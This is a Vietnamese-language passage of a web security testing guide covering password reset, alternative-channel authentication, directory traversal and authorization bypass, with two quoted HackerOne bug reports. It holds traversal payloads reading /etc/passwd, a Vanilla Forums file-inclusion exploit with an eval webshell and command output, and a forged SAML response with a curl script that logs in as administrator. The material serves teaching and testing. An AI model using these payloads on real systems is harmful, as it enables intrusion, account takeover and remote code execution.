- Xác định khả năng chống phá hoại của ứng dụng đối với quy trình thay đổi tài khoản cho phép ai đó thay đổi mật khẩu của tài khoản.
- Xác định khả năng chống lại việc đoán hoặc bỏ qua chức năng đặt lại mật khẩu.

**How to Test**

Đối với cả thay đổi mật khẩu và đặt lại mật khẩu, điều quan trọng là phải kiểm tra:

- Nếu người dùng, không phải quản trị viên, có thể thay đổi hoặc đặt lại mật khẩu cho các tài khoản không phải tài khoản của họ.
- Nếu người dùng có thể thao túng hoặc phá hoại quá trình thay đổi hoặc đặt lại mật khẩu để thay đổi hoặc đặt lại mật khẩu của người dùng hoặc quản trị viên khác.
- Nếu quá trình thay đổi hoặc đặt lại mật khẩu dễ bị CSRF tấn công.

1. Test Password Reset
    - Những thông tin cần thiết để thiết lập lại mật khẩu?
    - Mật khẩu đặt lại được thông báo cho người dùng như thế nào?
    - Mật khẩu đặt lại có được tạo ngẫu nhiên không?
    - Chức năng đặt lại mật khẩu có yêu cầu xác nhận trước khi thay đổi mật khẩu không?

2. Test Password Change
    - Mật khẩu cũ có được yêu cầu để hoàn tất thay đổi không

##### Example report

...

#### 4.5.10 OTG-AUTHN-010 (Testing for Weaker authentication in alternative channel)

##### Summary

Ngay cả khi các cơ chế xác thực chính không bao gồm bất kỳ lỗ hổng nào, thì có thể lỗ hổng đó tồn tại trong các kênh người dùng xác thực hợp pháp thay thế cho cùng một tài khoản người dùng. Các thử nghiệm nên được thực hiện để xác định các kênh thay thế và, tùy thuộc vào phạm vi thử nghiệm, xác định các lỗ hổng.

Các kênh tương tác người dùng thay thế có thể được sử dụng để phá vỡ kênh chính hoặc tiết lộ thông tin mà sau đó có thể được sử dụng để hỗ trợ một cuộc tấn công chống lại kênh chính. Bản thân một số kênh này có thể là các ứng dụng web riêng biệt sử dụng các tên hoặc đường dẫn máy chủ khác nhau. Ví dụ:

- Standard Website
- Di động hoặc thiết bị cụ thể, trang web được tối ưu hóa
- Trang web được tối ưu hóa khả năng truy cập
- Các trang web quốc gia và ngôn ngữ thay thế
- Các trang web song song sử dụng cùng một tài khoản người dùng (ví dụ: một trang web khác cung cấp các chức năng khác nhau của cùng một tổ chức, một trang web đối tác chia sẻ tài khoản người dùng)
- Các phiên bản phát triển, thử nghiệm, UAT và dàn dựng của trang web tiêu chuẩn

Nhưng chúng cũng có thể là các loại ứng dụng hoặc quy trình kinh doanh khác:

- Ứng dụng thiết bị di động
- Ứng dụng máy tính để bàn
- Nhà điều hành trung tâm cuộc gọi
- Phản hồi bằng giọng nói tương tác hoặc hệ thống cây điện thoại

Lưu ý rằng trọng tâm của test này là các kênh thay thế; một số lựa chọn thay thế xác thực có thể xuất hiện dưới dạng nội dung khác nhau được phân phối qua cùng một trang web và gần như chắc chắn sẽ nằm trong phạm vi thử nghiệm. Những điều này không được thảo luận thêm ở đây và lẽ ra phải được xác định trong quá trình thu thập thông tin và kiểm tra xác thực chính. Ví dụ:

- Progressive enrichment and graceful degradation that change functionality
- Sử dụng trang web không có cookie
- Sử dụng trang web không có JavaScript
- Sử dụng trang web không có phần bổ trợ như dành cho Flash và Java

Ngay cả khi phạm vi thử nghiệm không cho phép thử nghiệm các kênh thay thế, sự tồn tại của chúng phải được ghi lại. Những điều này có thể làm suy yếu mức độ đảm bảo trong các cơ chế xác thực và có thể là dấu hiệu báo trước cho thử nghiệm bổ sung.

**How to Test**

1. Understand the primary mechanism
2. Identify other channels
3. Enumerate authentication functionality
4. Review and test

##### Example report

...




### 4.6 OTG-AUTHZ (Authorization Testing)

#### 4.6.1 OTG-AUTHZ-001 (Testing Directory traversal/file include)

##### Summary

Theo truyền thống, máy chủ web và ứng dụng web triển khai cơ chế xác thực để kiểm soát quyền truy cập vào tệp và tài nguyên. Các máy chủ web cố gắng giới hạn các tệp của người dùng trong một "thư mục gốc" hoặc "gốc tài liệu web", đại diện cho một thư mục vật lý trên hệ thống tệp. Người dùng phải coi thư mục này là thư mục cơ sở trong cấu trúc phân cấp của ứng dụng web.

Nhiều ứng dụng web sử dụng tập lệnh phía máy chủ để bao gồm các loại tệp khác nhau. Phương pháp này khá phổ biến để quản lý hình ảnh, mẫu, tải văn bản tĩnh, v.v. Thật không may, các ứng dụng này để lộ các lỗ hổng bảo mật nếu các tham số đầu vào (tức là tham số biểu mẫu, giá trị cookie) không được xác thực chính xác.

Trong quá trình đánh giá, để phát hiện quá trình truyền tải đường dẫn và tệp bao gồm các lỗi, người kiểm tra cần thực hiện hai giai đoạn khác nhau:

- Liệt kê vectơ đầu vào (đánh giá có hệ thống từng vectơ đầu vào)
- Kỹ thuật kiểm tra (đánh giá có phương pháp đối với từng kỹ thuật tấn công được kẻ tấn công sử dụng để khai thác lỗ hổng)

**How to Test**

*Black Box testing*

1. Input Vectors Enumeration

    Để xác định phần nào của ứng dụng dễ bị bỏ qua xác thực đầu vào, người kiểm tra cần liệt kê tất cả các phần của ứng dụng chấp nhận nội dung từ người dùng. Điều này cũng bao gồm các truy vấn HTTP GET và POST và các tùy chọn phổ biến như tải lên tệp và biểu mẫu HTML

    Dưới đây là một số ví dụ về các kiểm tra sẽ được thực hiện ở giai đoạn này:

    - Có tham số yêu cầu nào có thể được sử dụng cho các hoạt động liên quan đến tệp không?
    - Có phần mở rộng tập tin bất thường?
    - Có tên biến thú vị?
    ```
    http://example.com/getUserProfile.jsp?item=ikki.html
    http://example.com/index.php?file=content
    http://example.com/main.cgi?home=index.htm
    ```
    - Có thể xác định cookie được ứng dụng web sử dụng để tạo các trang hoặc mẫu động không?
    ```
    Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower
    Cookie: USER=1826cc8f:PSTYLE=GreenDotRed
    ```

2. Testing Techniques

    Giai đoạn thử nghiệm tiếp theo là phân tích các chức năng xác thực đầu vào có trong ứng dụng web. Sử dụng ví dụ trước, trang động có tên getUserProfile.jsp tải thông tin tĩnh từ một tệp và hiển thị nội dung cho người dùng. Kẻ tấn công có thể chèn chuỗi độc hại "../../../../etc/passwd" để bao gồm tệp băm mật khẩu của hệ thống Linux/UNIX. Rõ ràng, kiểu tấn công này chỉ có thể xảy ra nếu điểm kiểm tra xác thực không thành công; theo các đặc quyền của hệ thống tệp, bản thân ứng dụng web phải có khả năng đọc tệp.

    Để kiểm tra thành công lỗ hổng này, người kiểm tra cần có kiến ​​thức về hệ thống đang được kiểm tra và vị trí của các tệp được yêu cầu. Không cần phải yêu cầu /etc/passwd từ máy chủ web IIS.
    ```
    http://example.com/getUserProfile.jsp?item=../../../../etc/passwd
    ```
    Đối với ví dụ về cookie:
    ```
    Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd
    ```
    Cũng có thể bao gồm các tệp và tập lệnh nằm trên trang web bên ngoài.
    ```
    http://example.com/index.php?file=file:///etc/passwd
    ```
    Nếu các giao thức được chấp nhận làm đối số, như trong các ví dụ trên, thì cũng có thể thăm dò các dịch vụ cục bộ và các dịch vụ lân cận.
    ```
    http://example.com/index.php?file=http://localhost:8080 
    or 
    http://example.com/index.php?file=http://192.168.0.2:9080
    ```
    Ví dụ sau đây sẽ chứng minh cách có thể hiển thị mã nguồn của thành phần CGI mà không cần sử dụng bất kỳ ký tự duyệt đường dẫn nào.
    ```
    http://example.com/main.cgi?home=main.cgi
    ```
    Thành phần có tên "main.cgi" nằm trong cùng thư mục với các tệp tĩnh HTML thông thường được ứng dụng sử dụng. Trong một số trường hợp, người kiểm tra cần mã hóa các yêu cầu bằng các ký tự đặc biệt (như dấu chấm ".", "%00" null, ...) để bỏ qua các điều khiển mở rộng tệp hoặc để ngăn việc thực thi tập lệnh.

    Mẹo Các nhà phát triển mắc lỗi phổ biến là không mong đợi mọi hình thức mã hóa và do đó chỉ thực hiện xác thực đối với nội dung được mã hóa cơ bản. Nếu lúc đầu, chuỗi kiểm tra không thành công, hãy thử một lược đồ mã hóa khác.


    Mỗi hệ điều hành sử dụng các ký tự khác nhau làm dấu tách đường dẫn:
    Unix-like OS:
    ```
    root directory: "/" 
    directory separator: "/" 
    ```
    Windows OS' Shell':
    ```
    root directory: "<drive letter>:\"  
    directory separator: "\" or "/"
    ```
    Classic Mac OS:
    ```
    root directory: "<drive letter>:" 
    directory separator: ":" 
    ```

    Chúng ta nên tính đến các cơ chế mã hóa ký tự sau:

    - Mã hóa URL và mã hóa URL kép
        ```
        %2e%2e%2f represents ../
        %2e%2e/ represents ../
        ..%2f represents ../
        %2e%2e%5c represents ..\
        %2e%2e\ represents ..\
        ..%5c represents ..\
        %252e%252e%255c represents ..\
        ..%255c represents ..\ and so on.
        ```
    - Mã hóa Unicode/UTF-8 (nó chỉ hoạt động trong các hệ thống có thể chấp nhận các chuỗi UTF-8 quá dài)
        ```
        ..%c0%af represents ../
        ..%c1%9c represents ..\
        ```
    
    Cũng có những cân nhắc cụ thể về hệ điều hành và framework ứng dụng khác. Chẳng hạn, Windows linh hoạt trong việc phân tích cú pháp đường dẫn tệp.
    
    - Windows shell: Việc thêm bất kỳ path nào sau đây vào các đường dẫn được sử dụng trong shell command không dẫn đến sự khác biệt về chức năng
        - Dấu ngoặc nhọn ">" và "<" ở cuối đường dẫn
        - Dấu ngoặc kép (đóng đúng cách) ở cuối đường dẫn
        - Các dấu hiệu thư mục hiện tại không liên quan như "./" hoặc ".\"
        - Các điểm đánh dấu thư mục mẹ không liên quan với các mục tùy ý có thể tồn tại hoặc không 
        - Ví dụ:
            ```
            – file.txt 
            – file.txt...
            – file.txt<spaces> 
            – file.txt”””” 
            – file.txt<<<>>>< 
            – ./././file.txt
            – nonexistant/../file.txt 
            ```
    - Windows API: Các mục sau đây sẽ bị loại bỏ khi được sử dụng trong bất kỳ lệnh trình bao hoặc lệnh gọi API nào trong đó một chuỗi được lấy làm tên tệp:
        ```
        periods
        spaces
        ```
    - Windows UNC Filepaths: Được sử dụng để tham chiếu các tệp trên phần chia sẻ SMB. Đôi khi, một ứng dụng có thể được tạo để tham chiếu đến các tệp trên đường dẫn tệp UNC từ xa. Nếu vậy, máy chủ Windows SMB có thể gửi thông tin xác thực được lưu trữ cho kẻ tấn công, thông tin này có thể bị bắt và bẻ khóa. Chúng cũng có thể được sử dụng với địa chỉ IP hoặc tên miền tự tham chiếu để trốn tránh các bộ lọc hoặc được sử dụng để truy cập các tệp trên phần chia sẻ SMB mà kẻ tấn công không thể truy cập được nhưng có thể truy cập được từ máy chủ web
    ```
    \\server_or_ip\path\to\file.abc
    \\?\server_or_ip\path\to\file.abc
    ```

    - Windows NT Device Namespace: Được sử dụng để chỉ không gian tên thiết bị Windows. Một số tham chiếu nhất định sẽ cho phép truy cập vào hệ thống tệp bằng một đường dẫn khác
        - Có thể tương đương với ký tự ổ đĩa, chẳng hạn như c:\ hoặc thậm chí là ổ đĩa không có ký tự được chỉ định.
            ```
            \\.\GLOBALROOT\Device\HarddiskVolume1\
            ```
        - Đề cập đến ổ đĩa đầu tiên trên máy.
            ```
            \\.\CdRom0\
            ```

*Gray Box testing*

Khi phân tích được thực hiện theo cách tiếp cận Gray box, người kiểm tra phải tuân theo phương pháp tương tự như trong Kiểm tra Black box. Tuy nhiên, vì có thể xem lại source code nên có thể tìm kiếm các vectơ đầu vào dễ dàng và chính xác hơn. Trong quá trình xem xét source code, họ có thể sử dụng các công cụ đơn giản để tìm kiếm một hoặc nhiều mẫu phổ biến trong mã ứng dụng: hàm/phương thức bao gồm, hoạt động của hệ thống tệp, v.v.

```
PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ... 
JSP/Servlet: java.io.File(), java.io.FileReader(), ...
ASP: include file, include virtual, ...
```

Sử dụng các công cụ tìm kiếm code trực tuyến (ví dụ: Ohloh Code[1]), cũng có thể tìm thấy các lỗi truyền tải đường dẫn trong phần mềm Nguồn mở được xuất bản trên Internet.

Đối với PHP, người kiểm tra có thể sử dụng:
```
lang:php (include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)
```

Sử dụng phương pháp Gray box testing, có thể phát hiện ra các lỗ hổng thường khó phát hiện hơn hoặc thậm chí không thể tìm thấy trong quá trình đánh giá Black box tiêu chuẩn.

Một số ứng dụng web tạo các trang động bằng cách sử dụng các giá trị và tham số được lưu trữ trong cơ sở dữ liệu. Có thể chèn các chuỗi duyệt đường dẫn được chế tạo đặc biệt khi ứng dụng thêm dữ liệu vào cơ sở dữ liệu. Loại vấn đề bảo mật này rất khó phát hiện do thực tế là các tham số bên trong các hàm bao gồm có vẻ bên trong và "an toàn" nhưng thực tế không phải vậy.


Ngoài ra, bằng cách review source code, có thể phân tích các chức năng được cho là xử lý đầu vào không hợp lệ: một số nhà phát triển cố gắng thay đổi đầu vào không hợp lệ để làm cho đầu vào hợp lệ, tránh các cảnh báo và lỗi. Các chức năng này thường dễ bị lỗi bảo mật.

Hãy xem xét một ứng dụng web với các hướng dẫn sau:

```
filename = Request.QueryString(“file”); 
Replace(filename, “/”,”\”); 
Replace(filename, “..\”,””);
```
Việc kiểm tra lỗ hổng được thực hiện bằng cách:
```
file=....//....//boot.ini 
file=....\\....\\boot.ini 
file= ..\..\boot.ini 
```

##### Example report

link to report: https://hackerone.com/reports/411140

**Summary:**
Người dùng quản trị viên được xác thực có thể kích hoạt directory traversal để yêu cầu lệnh gọi dẫn đến bao gồm tệp cục bộ, điều này có thể cho phép kẻ tấn công giành được quyền thực thi mã từ xa. 

**Notes:**
- Bạn cần có một session quản trị để chạy poc này.
- Bạn có thể sử dụng chuyển đổi thư mục để tiếp cận bên ngoài web root
- Mặc dù poc này sử dụng lỗi unserialize, xin lưu ý rằng nguyên nhân gốc rễ cơ bản là do truyền tải thư mục và không có kiểm tra nào được thực hiện trên `$type`.
- Đừng quên dọn sạch tệp `-index.php` trong thư mục conf
- Tôi đã phải điều chỉnh một chút chuỗi cửa sổ bật lên và thêm hai chữ số vào số thuộc tính cho lớp Gdn_ConfigurationSource nếu không ứng dụng sẽ không phân tích payload được serialize đúng cách. Tôi không chắc tại sao, tôi đã không bận tâm điều tra nó vì tôi đã tìm thấy một công việc dễ dàng xung quanh.

**Analysis**

Bên trong tệp application/dashboard/controllers/class.addoncachecontroller.php, chúng ta có thể thấy có một hàm có thể truy cập `verify()` chấp nhận một tham số kiểu.

```php
    /**
     * Verify the addon cache is current.
     *
     * @param string $type
     * @throws Exception if no type specified.
     */
    public function verify($type) {
        $this->permission('Garden.Settings.Manage');

        if ($type === null) {
            throw new Exception('Type required');
        }

        $cached = Gdn::addonManager()->lookupAllByType($type);              // 1
        $current = Gdn::addonManager()->scan($type);

        $new = array_keys(array_diff_key($current, $cached));
        $invalid = array_keys(array_diff_key($cached, $current));

        $updateRequired = (count($new) || count($invalid));
```
Tại [1], chúng ta có thể thực hiện lệnh gọi lookupAllByType() trên lớp addonManager với `tpye` do kẻ tấn công kiểm soát.

```php
class AddonManager {

    ...

    private function typeUsesMultiCaching($type) {
        return $type === Addon::TYPE_ADDON;
    }

    ...

    /**
     * Get all of the addons of a certain type.
     *
     * @param string $type One of the **Addon::TYPE_*** constants.
     * @return array Return an array of addon indexed by their keys.
     */
    public function lookupAllByType($type) {                                                                // 2
        if ($this->typeUsesMultiCaching($type)) {                                                           // 3
            $this->ensureMultiCache();
            return $this->multiCache;
        } else {
            $index = $this->getSingleIndex($type);                                                          // 4
            $addons = [];
            foreach ($index as $addonDirName => $addonDirPath) {
                try {
                    $addon = $this->lookupSingleCachedAddon($addonDirName, $type);
                    $addons[$addon->getKey()] = $addon;
                } catch (\Exception $ex) {
                    trigger_error("The $type in $subdir is invalid and will be skipped.", E_USER_WARNING);
                    // Clear the addon out of the index.
                    $this->deleteSingleIndexKey($type, $addonDirName);
                }
            }
            return $addons;
        }
    }

    ...

    /**
     * Get the index for an addon type that is cached by single addon.
     *
     * @param string $type One of the **Addon::TYPE_*** constants.
     * @return array Returns the index mapping [addonDirName => addonDirPath]
     */
    private function getSingleIndex($type) {                                                                // 5
        if (!isset($this->singleIndex[$type])) {
            $cachePath = "$type-index.php";                                                                 // 6

            if ($this->isCacheEnabled() && is_readable("$this->cacheDir/$cachePath")) {                     // 7
                $this->singleIndex[$type] = require "$this->cacheDir/$cachePath";                           // 8
            } else {
                $addonDirs = $this->scanAddonDirs($type);

                $this->saveArrayCache($cachePath, $addonDirs);

                $this->singleIndex[$type] = $addonDirs;
            }
        }
        return $this->singleIndex[$type];
    }
```

Tại [2] chúng ta nhập hàm và tại [3] chúng ta không đi vào khối mã đầu tiên dưới dạng != cho Addon::TYPE_ADDON. Sau đó, tại [4], chúng tôi gọi `getSingleIndex()` bằng cách sử dụng `type` bị kiểm soát. Sau đó, tại [5] chúng tôi nhập hàm, tại [6] chúng tôi đặt biến `$cachePath` được chờ trước với attack string. Sau đó, tại [7], chúng ta kiểm tra xem đường dẫn tệp có thể được đọc không và nếu có, chúng ta kích hoạt inclusion tệp bằng cách sử dụng `require()`.
Lưu ý rằng không có biện pháp bảo vệ nào ở đây đối với các traversal như vậy, và do đó, kẻ tấn công từ xa, dựa vào ngữ cảnh có thể tận dụng điều này để thực hiện rce. Tuy nhiên, lỗi này yêu cầu kẻ tấn công phải có điều kiện cần thiết sau:
- Họ có thể upload một tệp trong bất kỳ thư mục nào có tên "*-index.php" có chứa một số mã PHP.
Mặc dù điều này nghe có vẻ khó khăn, nhưng trên thực tế, rất có thể thực hiện điều này trên hầu hết các ứng dụng. Vì Vanilla không cho phép điều này theo mặc định nên tôi đã đánh dấu lỗi này ở mức trung bình (không cao), nhưng bạn nên hết sức cẩn thận đối với các chức năng inclusion.

**Exploitation:**

Như đã nêu ở trên, chúng ta cần một điều kiện ghi để viết tệp *-index.php ở đâu đó trên hệ thống tệp bằng mã của chúng ta. Vì vậy, tôi đã tận dụng lỗ hổng unserialize() từ một báo cáo trước đó để có được điều kiện đó. (link to unserialize vulnerability: https://hackerone.com/reports/410237)
Sau đó, tôi đã sử dụng tính năng inclusion tệp và traversals để chuyển nó vào thư mục conf. Lưu ý traversals ở đây chính là căn nguyên vấn đề:

```
POST /index.php?p=/dashboard/addoncache/verify/..%252fconf%252f HTTP/1.1
Host: 172.16.175.143
Cookie: Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzkyMDMxMzMsImlhdCI6MTUzNjYxMTEzMywic3ViIjoyfQ.Hgphc_1Vn2uEqFgFjxtc2s9kGYCP6xC4QRx5NJJwN_U
Connection: close
Content-Type: application/x-www-form-urlencoded;
Content-Length: 61

c=system('id');die();
```

phản hồi từ máy chủ web trông như thế này:

```
HTTP/1.1 200 OK
Date: Tue, 18 Sep 2018 14:59:01 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: Vanilla-tk=gLApzQGeSNA2zPpI%3A2%3A1537282741%3A0e76e0b87aee826b7a810b37c505b34e; path=/; HttpOnly
P3P: CP="CAO PSA OUR"
Content-Length: 54
Connection: close
Content-Type: text/html; charset=UTF-8

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Tất nhiên, như mọi khi, tôi đã cung cấp một bản khai thác đầy đủ chức năng. Phần thú vị về cách khai thác này là tôi không cần phải sửa tệp constants.php vì chúng tôi đang viết một tệp hoàn toàn mới (có nghĩa là tôi không làm hỏng hệ thống).
Việc dọn dẹp đang xóa tệp đã viết:

```
steven@pluto:/var/www/html$ cat conf/-index.php 
<?php if (!defined('APPLICATION')) exit();
$a=eval($_POST[c]);//[''] = '';

// Last edited by admin (172.16.175.1)2018-09-18 14:43:21steven@pluto:/var/www/html$
```

**Example:**

```
saturn:vanilla_forums_addoncache_verify_lfi_rce mr_me$ ./poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzkyMDMxMzMsImlhdCI6MTUzNjYxMTEzMywic3ViIjoyfQ.Hgphc_1Vn2uEqFgFjxtc2s9kGYCP6xC4QRx5NJJwN_U
(+) targeting: http://172.16.175.143
(+) created a shell at conf/-index.php!
(+) we can only reach it with the file inclusion!
(+) dropping to a fake shell!
www-data@pluto:/var/www/html$ id;uname -a
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux pluto 4.15.0-33-generic #36-Ubuntu SMP Wed Aug 15 16:00:05 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

www-data@pluto:/var/www/html$ exit

saturn:vanilla_forums_addoncache_verify_lfi_rce mr_me$
```

**Impact**
Kẻ tấn công phụ thuộc vào ngữ cảnh có thể đạt được thực thi mã từ xa

#### 4.6.2 OTG-AUTHZ-002 (Testing for Bypassing Authorization Schem)

##### Summary

Loại thử nghiệm này tập trung vào việc xác minh cách triển khai lược đồ ủy quyền cho từng vai trò hoặc đặc quyền để có quyền truy cập vào các chức năng và tài nguyên dành riêng.


Đối với mọi vai trò cụ thể mà người kiểm tra nắm giữ trong quá trình đánh giá, đối với mọi chức năng và yêu cầu mà ứng dụng thực thi trong giai đoạn hậu xác thực, cần phải xác minh:

- Có thể truy cập tài nguyên đó ngay cả khi người dùng không được xác thực không?
- Có thể truy cập tài nguyên đó sau khi đăng xuất không?
- Có thể truy cập các chức năng và tài nguyên mà người dùng có vai trò hoặc đặc quyền khác có thể truy cập được không?

Cố gắng truy cập ứng dụng với tư cách là người dùng quản trị và theo dõi tất cả các chức năng quản trị.

- Có thể truy cập các chức năng quản trị nếu người kiểm tra được đăng nhập với tư cách là người dùng có đặc quyền tiêu chuẩn?
- Có thể sử dụng các chức năng quản trị này với tư cách là người dùng có vai trò khác và hành động đó nên bị từ chối đối với ai không?

**How to test**

1. Testing for access to administrative functions

    Ví dụ: giả sử rằng chức năng 'AddUser.jsp' là một phần của menu quản trị của ứng dụng và có thể truy cập chức năng này bằng cách yêu cầu URL sau:
    ```
    https://www.example.com/admin/addUser.jsp
    ```
    Sau đó, yêu cầu HTTP sau được tạo khi gọi hàm AddUser:
    ```
    POST /admin/addUser.jsp HTTP/1.1
    Host: www.example.com
    [other HTTP headers]

    userID=fakeuser&role=3&group=grp001
    ```

    Điều gì xảy ra nếu người dùng không phải quản trị viên cố gắng thực hiện yêu cầu đó? Người dùng sẽ được tạo ra? Nếu vậy, người dùng mới có thể sử dụng các đặc quyền của họ không?

2. Testing for access to resources assigned to a different role

    Ví dụ: phân tích một ứng dụng sử dụng thư mục dùng chung để lưu trữ các tệp PDF tạm thời cho những người dùng khác nhau. Giả sử rằng documentABC.pdf chỉ có thể được truy cập bởi người dùng test1 với roleA. Xác minh xem người dùng test2 với roleB có thể truy cập tài nguyên đó không.

##### Example report

link to report: https://hackerone.com/reports/136169

**Overview:**

Các trang web *.uber.com WordPress sử dụng OneLogin SAML-SSO thay vì thông tin đăng nhập WordPress thông thường. Plugin WordPress do OneLogin cung cấp có một lỗi cho phép mọi người đăng nhập mà không cần mật khẩu hoặc xác thực khác.

Kẻ tấn công có thể cung cấp tên người dùng, địa chỉ email, tên và vai trò. Nếu tên người dùng chưa tồn tại trong cơ sở dữ liệu WordPress, thì plugin sẽ tạo một người dùng mới (nếu provisioning setting được bật, cài đặt này có trên hai trang web tôi đã thử nghiệm).

Có vẻ như để giành được đặc quyền của quản trị viên, kẻ tấn công phải đoán một số thông tin - tên vai trò chẳng hạn như "administrator" hoặc email hoặc username của quản trị viên hiện tại.

**PoC:**

Tôi đã thử điều này trên hai trang web. Trên eng.uber.com, tôi không thể đoán đúng tên vai trò, tên người dùng hoặc địa chỉ email để nhận đặc quyền của quản trị viên và do đó chỉ có thể tạo tài khoản cấp "subscriber". 

Trên newsroom.uber.com, tên vai trò dường như chỉ đơn giản là "administrator" nên tôi có đặc quyền đó trên hệ thống. Một số plugin settings khác cũng có thể ảnh hưởng đến hành vi này.

**Reproducing:**

An example shell script:
```
#!/bin/sh
xml=`base64 response.xml`
curl -v 'https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs' \
    --data "RelayState=/wp-login.php" --data-urlencode "SAMLResponse=$xml"
```

Required file "response.xml" chứa một SAML response:

```xml
<samlp:Response xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="R0bdb6f33ef84425aa2782eab4483792762f297df" Version="2.0" IssueInstant="2016-05-04T01:37:34Z" Destination="" InResponseTo="ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c">
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" Version="2.0" ID="pfxb75932c2-2e44-d18d-224b-354849a292af" IssueInstant="2016-05-04T01:37:34Z">
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
                jouko@iki.fi
            </saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData NotOnOrAfter="2016-05-04T01:40:34Z" Recipient="" InResponseTo="ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions NotBefore="2016-05-04T01:34:34Z" NotOnOrAfter="2016-05-04T01:40:34Z">
            <saml:AudienceRestriction>
                <saml:Audience>
                    php-saml
                </saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="2016-05-04T01:37:33Z" SessionNotOnOrAfter="2016-05-05T01:37:34Z" SessionIndex="_b340ffa0-f3c6-0133-3483-02a5406d9a2f">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>
                    urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
                </saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
        <saml:AttributeStatement>
            <saml:Attribute NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic" Name="User.Username">
                <saml:AttributeValue xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">
                    admin
                </saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic" Name="User.LastName">
                <saml:AttributeValue xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">
                    Pynnonen
                </saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic" Name="User.FirstName">
                <saml:AttributeValue xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">
                    Jouko
                </saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic" Name="User.email">
                <saml:AttributeValue xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">
                    noreply@uber.com
                </saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic" Name="memberOf">
                <saml:AttributeValue xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">
                    Administrator
                </saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>
```

Việc run script sẽ gửi một yêu cầu HTTP chứa fake response SAML giả mạo tới WordPress. Plugin chấp nhận nó, đặt cookie xác thực và chuyển hướng người dùng đến front page.

Sample WP response:

```
HTTP/1.1 302 Found
Server: nginx
Date: Wed, 04 May 2016 06:24:22 GMT
Content-Type: text/html
Content-Length: 20
Connection: keep-alive
Keep-Alive: timeout=20
Set-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/wp-content/plugins; secure; httponly
Set-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/; secure; httponly
Set-Cookie: wordpress_logged_in_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ce566c71dac745da6f17cd52c7c3c2d3f0cc6baec81b4d79d97fb153896e0acee; path=/; secure; httponly
Set-Cookie: saml_login=1; expires=Thu, 04-May-2017 06:24:22 GMT; path=/
Set-Cookie: wordpress_user_sw_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/
Set-Cookie: wordpress_user_sw_secure_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/
Set-Cookie: wordpress_user_sw_olduser_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/
Location: https://newsroom.uber.com
```

**Details:**

Plugin WordPress không thể xác thực đầy đủ phản hồi SAML. Lỗi nằm trong tệp wp-content/plugins/onelogin-saml-sso/php/lib/Saml2/Response.php, hàm isValid(). Việc kiểm tra cryptographical signature nằm bên trong một khối mã chỉ được thực thi nếu phản hồi XML chứa thẻ `<ds:Signature />`.

```
   if (!empty($signedElements)) {
       // verify signature
   }
```

